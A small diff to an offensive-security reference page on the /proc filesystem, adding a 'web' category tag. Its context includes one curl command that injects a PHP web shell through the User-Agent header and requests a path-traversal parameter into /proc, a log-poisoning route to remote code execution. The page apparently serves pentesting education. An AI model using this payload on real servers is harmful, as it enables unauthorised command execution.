@@ -1,5 +1,6 @@
 ---
 authors: ShutdownRepo
+category: web
 ---
 
 # /proc
@@ -18,4 +19,3 @@ curl --user-agent "<?php passthru($_GET['cmd']); ?>" $URL/?parameter=../../../pr
 ::: details 🛠️ /proc/*/fd
 
 :::
-
